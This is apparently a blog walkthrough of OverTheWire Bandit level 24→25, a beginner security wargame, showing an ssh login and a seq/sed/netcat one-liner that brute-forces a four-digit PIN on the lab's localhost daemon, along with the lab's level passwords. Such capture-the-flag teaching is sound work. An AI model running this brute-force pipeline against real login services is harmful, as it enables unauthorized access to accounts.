---
date: 2023-01-27 00:00:00 +0700
layout: post-with-comments
title: "OverTheWire Bandit Level 24 → 25 tutorial!!"
permalink: /posts/overTheWire-Bandit-Level-24-to-25/
tags: [overthewire, bandit, walkthrough, ctf, linux, beginner]
description: "A step by step tutorial for OverTheWire Bandit Level 24 → 25!!"
---
<!-- Scoped styles: only affect this post -->

<style>
  .bandit-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .bandit-nav .nav-left,.bandit-nav .nav-center,.bandit-nav .nav-right{flex:1}
  .bandit-nav .nav-left{text-align:left}
  .bandit-nav .nav-center{text-align:center}
  .bandit-nav .nav-right{text-align:right}
  .bandit-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .bandit-nav a:hover{transform:translateY(-1px)}
  .bandit-nav .disabled{opacity:.55}
  :root[data-theme='light'] .bandit-nav a{border-color:rgba(0,0,0,.15)}
</style>

<nav class="bandit-nav" aria-label="Bandit level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Bandit-Level-23-to-24/' | relative_url }}">← Previous: Level 23 → 24</a>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/bandit/bandit25.html" target="_blank" rel="noopener">Official (Level 25) ↗</a>
  </div>

  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Bandit-Level-25-to-26/' | relative_url }}">Next: Level 25 → 26 →</a>
  </div>
</nav>

## Login

Log in as **bandit24** using the password you obtained from Level 23 → 24.

```bash
ssh bandit24@bandit.labs.overthewire.org -p 2220
# password: gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```

> Why? Each Bandit level is a separate UNIX user. To solve 24 → 25, you must be the `bandit24` user.

## Task

![Task placeholder]({{ '/assets/images/bandit/level-24-to-25/task.jpg' | relative_url }})

A **daemon** is listening on **`localhost:30002`**. It will print the password for **`bandit25`** when you send **two values on one line**:

1. the **current password** (for `bandit24`)
2. a secret **4-digit pincode**.

There’s no trick to the pincode — you must **brute force** it (0000–9999). The service lets you try **many codes over one connection**.

## A little bit of Theory

* **Brute forcing a small keyspace**: 10,000 combinations (0000–9999) is tiny; a simple loop will do.
* **`seq -w 0000 9999`** prints numbers with **zero-padding** (0000, 0001, …, 9999).
* **Piping into `nc`** (`netcat`) feeds all attempts through **one TCP session** (faster and matches the level hint).
* We’ll **tee** the output to a file, then grep the line that contains the next password.

**Further reading:**

* <a href="https://man7.org/linux/man-pages/man1/seq.1.html" target="_blank" rel="noopener">`seq` manual</a> · <a href="https://linux.die.net/man/1/nc" target="_blank" rel="noopener">`nc` (netcat)</a>

## Solution

1. **Confirm the prompt (optional)**

   ```bash
   nc localhost 30002
   # You'll see a prompt asking for "password for bandit24 and the secret pincode"
   ```

   *Why?* Verifies the service and the exact input format (both values **on one line**, separated by a space).

   ![prompt placeholder]({{ '/assets/images/bandit/level-24-to-25/prompt.jpg' | relative_url }})

2. **Brute-force all 4-digit pins in a single connection**

   ```bash
   PASS='gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8'
   seq -w 0000 9999 | sed "s/^/$PASS /" | tee /tmp/b25_attempts.log | nc localhost 30002 | tee /tmp/b25_output.log
   ```

   *Why?*

   * `seq -w` generates `0000…9999`.
   * `sed "s/^/$PASS /"` prefixes each pin with your password plus a space.
   * `nc localhost 30002` sends all attempts over **one** connection.
   * `tee` saves output so you can search it afterward.

   ![brute force placeholder]({{ '/assets/images/bandit/level-24-to-25/brute.jpg' | relative_url }})

3. **Extract the password from the output**

   After the loop finishes (or as it runs), look for a line that contains the next password:

   ```bash
   grep -iE 'password|bandit25' /tmp/b25_output.log
   ```

   You should see a line revealing the **`bandit25`** password.

   ![success placeholder]({{ '/assets/images/bandit/level-24-to-25/success.jpg' | relative_url }})

4. **Log in to the next level (bandit25)**

   ```bash
   exit
   ssh bandit25@bandit.labs.overthewire.org -p 2220
   # paste the password you just found
   ```

## Password

> This is the password shown in my run; copy the one from your terminal if it differs.

```
iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```

**Troubleshooting**

* **“Timeout. Exiting.”** → It’s fine; just re-run the pipeline. The service still accepts multiple attempts per connection; avoid creating 10k separate connections.
* **No output captured?** → Keep the `tee /tmp/b25_output.log` in the pipeline and inspect that file.
* **Wrong input format** → Make sure each line is exactly `password<space>4digits`.
* **Too slow?** → Use `seq -w` (faster than a subshell loop) and keep everything in **one** `nc` session as shown.
* **Accidental newline/extra spaces** → Copy the password carefully; mismatched whitespace causes all attempts to fail.

---

## Copy-paste quick run (one shot)

```bash
PASS='gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8'
seq -w 0000 9999 | sed "s/^/$PASS /" | tee /tmp/b25_attempts.log | nc localhost 30002 | tee /tmp/b25_output.log
grep -iE 'password|bandit25' /tmp/b25_output.log
```

---

**Congrats 🎉** You brute-forced the 4-digit pincode over a single TCP session and grabbed the credentials — welcome to **bandit25**!

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})
